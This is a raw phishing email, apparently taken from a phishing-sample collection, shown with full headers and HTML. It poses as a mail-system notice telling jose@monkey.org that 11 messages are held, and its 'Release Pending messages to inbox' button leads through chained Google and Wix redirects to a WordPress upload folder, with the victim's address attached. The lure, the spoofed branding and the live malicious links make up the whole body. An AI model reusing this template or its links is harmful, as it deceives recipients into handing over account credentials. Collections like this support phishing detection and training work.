@@ -1,0 +1,117 @@
+Return-Path: info@bacovvood.com
+Delivered-To: jose@monkey.org
+X-FDA: 83818537446.27.159668E
+Received: from bacovvood.com (bacovvood.com [185.184.121.166])
+	by imf06.b.hostedemail.com (Postfix) with ESMTP id 76780C0008
+	for <jose@monkey.org>; Tue, 26 Aug 2025 10:29:42 +0000 (UTC)
+Authentication-Results: imf06.b.hostedemail.com;
+	dkim=pass header.d=bacovvood.com header.s=baco header.b=DfPgmUVG;
+	dmarc=pass (policy=quarantine) header.from=bacovvood.com;
+	spf=pass (imf06.b.hostedemail.com: domain of info@bacovvood.com designates
+ 185.184.121.166 as permitted sender) smtp.mailfrom=info@bacovvood.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1756204182;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=nAf82bl+6kMrfYd6Gqv3zx2knC31pUbfsqHlgwaQpoQ=;
+	b=O1A58ez341yizuJv7oEyNMvo0SMFuETBzStUTZP+BZes7sY33PGbD4pRpHBwiMXrOlVHH5
+	02BTigTduf3JwciZ53AsOWz10VrNS0OAYUUFItwrcLBo+gUDISMlwdamzYdX1z3PIVR/wP
+	bTmTbTuLebFO38pGeq2kgAhb502Pq5g=
+ARC-Authentication-Results: i=1;
+	imf06.b.hostedemail.com;
+	dkim=pass header.d=bacovvood.com header.s=baco header.b=DfPgmUVG;
+	dmarc=pass (policy=quarantine) header.from=bacovvood.com;
+	spf=pass (imf06.b.hostedemail.com: domain of info@bacovvood.com designates
+ 185.184.121.166 as permitted sender) smtp.mailfrom=info@bacovvood.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1756204182; a=rsa-sha256;
+	cv=none;
+	b=kXY63S2rklGriCc+4Do6ApMrOyXfM7A2puUUxYdZREyy73dO5qt1o6gMqY03JyaevLIQ/7
+	DOhSJ7Z308Ye+32zqnJ5dmXTFzyVs9BHECv8MbvsSgD3EMLi3jf/LOkZimHSUcZV8ne8Ld
+	dXJ23K8vV3atxeJYQUY6Ji24s93rDBI=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=baco; d=bacovvood.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=info@bacovvood.com;
+ bh=nAf82bl+6kMrfYd6Gqv3zx2knC31pUbfsqHlgwaQpoQ=;
+ b=DfPgmUVGM7p9b4pgNciMT08JA40XUFYYOI5cxdlKFbCDC2K1NXUkEONenQ1A/Ug76iHz4G1LLZ/H
+   30Nnk4QFCzp3akzzaQcTF3mb3lB14w8rMezMDKQJf/6mb1JT1iJYP/R5StyWIhoad1qUP90WZhQQ
+   iS58+k+RQto+S8Ezwz2SDqqXC+nPIcbZKUwLrh6HcpmNlAbYcbCIQB6Q2MeReY+RQ9lauvJWQWEY
+   KLjKrzX3E12F0kGVhFC99v49lh6rngNUVKCtZgqr3PxfjPJs2w5eq09PfCo/0m5W3xC1XYqn0oZc
+   4NYfZPNilLBNhiQTEledSmfbJ+cTiOfamQyuvw==
+From: "jose" <info@bacovvood.com>
+To: jose@monkey.org
+Subject: PENDING MESSAGE
+Date: 26 Aug 2025 12:29:40 +0200
+Message-ID: <20250826122940.BA23A33123DE45C2@bacovvood.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Server: rspam04
+X-Rspamd-Queue-Id: 76780C0008
+X-Stat-Signature: djqkx1gydfazth3jho3nn1ehe16j9mr6
+X-Spam-Status: No, score=3.08
+X-HE-Tag: 1756204182-777061
+X-HE-Meta: 
+ U2FsdGVkX19QUfA3Z4f3OnZSVfn2h9pjI6lrTpKj4ld4HGPl0c1ZPmtI6vHUMK7yQHZ6xqohGVjBAfGqeqAjC4sJ6rTzQJC8mt2v692/jdQgiOXB3Mw/Cpl8dXVvqG4i142G7MSByH+2JKxTwlqr/I2lh6M+mq86fc0JKRkX2F7uXznOrxS+oLwFTPFyY53PxHjijB0xWZQ2mBOJ/Iz6C+lV37DGOz5vVZKVN34VDuKIvW1A9HCoakqEoMSDgUHZtDfWS4gyIQdmaCSFIBBxS5GezlsaCafPUoDfDpF1ZUBcdocGJx+yN1AJu+4itQVgqFFFiJVonm9nON0Opk5XSJZsjWgQB1tUx1ZVn9SUrA55do2Qs9m8KEFoJTJvy8FineZTxJ57Fdn5JBPaw1C2y6vcZxelb0xACfRxQ+Bp4nTiTxIClVKmBRbTnjekUycm/aajCQK6R0YTIJYzrni4kV3ksmi8wLWMGF4BoZSQZJG6e7xTBa2UPBJ86l1EdV6VhYauGDO8GP796qVmComk5PqUQJuxGb17hH1yRYv4/8qo/khEINIOTdrDe/QrjJiG48CWaWup5Lk70CxAGwLf1boGVbXV2pJxg1be+pFyiXyVIl+xENUsTRkazp9bT1TuZL5zbc/K2PePKsbldvnv9k2WDqaScunpoQ5WmCVBRO5iy/IFnzIBlhme8KYXc8nROCFL95ktLSAeGHJ8DxZSna1PeKo//FmedyB+wp30/89LG62P5Y0tP5/EECcQAFV82Yf+Kym1+UbPZBXrsKar0ymkyjDSuhWQN7OIwhph8havpE/hC0KyaXXyg5d5+D3B7mnl4Gc8UrW82QpD+OHSkFfbjTJVZAAPSR71FKl+l9vwlPUWxgdGE9DIYdbd6jMgqfQhHtijE8IWjPsbvfX+2orTwNojpwcLQp9DEhikZMGDxgjJUHEQflc4wYqLygACQf+GL1TMcTONNdP3MIFQkksDJuI
+ DGjqe6vpbqJ4tIbB31HieXwZshiO3vRRtLohV0V7wnpUZX/TdmWrucLtqauozzRYV7StlGSOj9U4QQUu6Qbk3aNSEKt2bZ08LJrRe5dQaaSVFj9J6Gi40GkpLJ24ZvZdnuBP6duPbl0qoLHzuH8zO+L4uQR855VFaOuVXCg0p1j9rODBEIFzYFA9v3lVE5380b0w2y/DUtTAuNl0b8WgFl+2NG8QyL064777JZwSPG14x6kt3NCmPqneyPIdRfwyAAN0jwFRyvr9jrSJDSWrp5QyCczKYslLBmPBfcLXWftDhxqrRg6oSqdm/Vd9qBq7bx3r5sUMyhqXkXZdeXI0YB4VBfu+MaTOzyE2TCIK7HniFTi4mOmsw8xuYFP9QUrJENyQXuHwwpwjlj45aORYXenvMQ7ypWz44aq6Ixyd1gd1jhXN6goCzwoDl62woqUZG7mwigmqXuiic43HYCMQuTDNsgwpP5DGQusWa44HExlNBHYvPdhPE4m2Yw7BvHfTdVlA7kWCYmz62NZIC/oDHzbAerzAY7fhx397JyevreX8H0rMp8mvYVMjqlyGx70KPtO3TAXdRMMdZj0fU0H6Oeew4SYwMrvdzS0b4GBRYwmPH3smYmzu56goL4a7mz+pcXNVs
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 339
+
+<html><head>
+<title>
+</title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+
+<body>
+<table width=3D"520" align=3D"center" style=3D'width: 520px; color: rgb(15,=
+ 60, 81); text-transform: none; letter-spacing: normal; font-family: "Segoe=
+ UI", Arial, Helvetica; font-size: 12px; font-style: normal; font-weight: 4=
+00; word-spacing: 0px; white-space: normal; border-collapse: collapse; orph=
+ans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'><tbody sty=
+le=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td st=
+yle=3D"margin: 0px; height: 90px; box-sizing: border-box; background-color:=
+ rgb(0, 120, 215);"><div style=3D"box-sizing: border-box;"><div style=3D'ma=
+rgin: 0px 30px; padding: 0px; color: rgb(255, 255, 255); font-family: "Sego=
+e UI Light", "Segoe WP Light", "Segoe UI", Helvetica, Arial, serif; font-si=
+ze: 18px; box-sizing: border-box;'>
+<div style=3D"margin: 0px 0px 0px 10px; padding: 0px; font-size: 28px; box-=
+sizing: border-box;">monkey.org</div></div></div></td></tr><tr style=3D"box=
+-sizing: border-box;"><td style=3D"margin: 0px; padding: 20px; color: rgb(5=
+1, 51, 51); line-height: 20px; direction: ltr; box-sizing: border-box;"><di=
+v style=3D"box-sizing: border-box;"><div style=3D"box-sizing: border-box;">=
+<font face=3D"Segoe UI, Arial, Helvetica, sans-serif">Dear jose@monkey.org<=
+/font><span>&nbsp;</span>
+<font face=3D"Segoe UI, Arial, Helvetica, sans-serif">,</font></div><br sty=
+le=3D"box-sizing: border-box;"><div style=3D'font-family: "Segoe UI", Arial=
+, Helvetica, sans-serif; box-sizing: border-box;'>You have [11] unapproved =
+emails on&nbsp;8/26/2025 12:29:40 p.m.&nbsp;and This was caused due to a sy=
+stem delay. Please rectify below:</div><br style=3D"box-sizing: border-box;=
+"><div style=3D'font-family: "Segoe UI", Arial, Helvetica, sans-serif; box-=
+sizing: border-box;'>
+<a style=3D"background: rgb(0, 120, 215); padding: 5px; color: rgb(255, 255=
+, 255); display: block; box-sizing: border-box; text-decoration-line: none;=
+" href=3D"https://www.google.com/url?q=3Dhttps%3A%2F%2Fwww.orthelys.fr%2Fwp=
+-content%2Fuploads%2F2024%2F10%2Fabuk%2F&amp;sa=3DD&amp;sntz=3D1&amp;usg=3D=
+AOvVaw1pC1MMWNyrpG6BFyJ5uyRV#jose@monkey.org" target=3D"_blank" rel=3D"nore=
+ferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://shoutout.wix=
+=2Ecom/so/e7PSpNtdf/c?w%3DKjQ21pl3l8HPu-fKO99u7HZ8b9opavyVdlPz7P1Pmew.eyJ1I=
+joiaHR0cHM6Ly9jaG9nYXRoLmNvLnVrLy9yZWRpcmFsbC9pbmRleC5odG1sIiwiciI6IjdkZjBj=
+NDc1LTFjY2ItNDM4Ni1hMWYzLWFiMWNkM2ExMmIyMCIsIm0iOiJtYWlsIiwiYyI6ImE3MGJlMjZ=
+mLTdhN2YtNDdhMy05YzhmLWYwMjk2N2IzYzlmMyJ9%23%5B%5B-Email-%5D%5D&amp;source=
+=3Dgmail&amp;ust=3D1756283017778000&amp;usg=3DAOvVaw299eBVscORy_bU0HIyRsgi"=
+>Release Pending messages to inbox.</a></div>
+<br style=3D"box-sizing: border-box;"><div style=3D'font-family: "Segoe UI"=
+, Arial, Helvetica, sans-serif; box-sizing: border-box;'><br></div></div></=
+td></tr></tbody></table></body></html>
+
